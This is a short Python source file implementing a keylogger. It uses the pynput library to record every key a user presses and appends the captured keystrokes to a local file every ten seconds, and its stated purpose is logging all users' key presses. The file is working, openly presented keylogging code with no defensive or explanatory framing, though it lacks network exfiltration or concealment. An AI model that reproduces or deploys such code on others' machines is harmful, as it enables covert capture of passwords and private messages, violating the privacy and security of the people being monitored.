'''
    author : zerobits01
    created: 25-Jan-2020
    purpose: logging all users pressed key on keyboard
'''

import pynput.keyboard
import datetime
import threading


class Keylogger:

	def __init__(self, out_file=None, interval=10):
		'''
            out_file : writing the sniffed keyboard result on file
        '''
		self.captured = "# Started at %s\n" % \
						(datetime.datetime.now().strftime('%y.%m.%d %H:%M'))
		self.output_file = out_file
		self.writeOnFile()
		self.captured = ""
		self.interval = interval

	def process_key_press(self,key):
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = " "
			else:	
				current_key = " " + str(key) + " "
		self.captured = self.captured + current_key

	def report(self):
		self.writeOnFile()
		self.captured = "\n"
		timer = threading.Timer(self.interval,self.report)
		timer.start()

	def writeOnFile(self):
		with open(file=self.output_file, mode='a+') as f:
			f.writelines(self.captured)
			self.captured = ""

	def start(self):
		keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

	def __del__(self):
		self.writeOnFile()

if __name__ == "__main__":
	my_keylogger = Keylogger(out_file='/root/Projects/Python/test.txt')
	my_keylogger.start()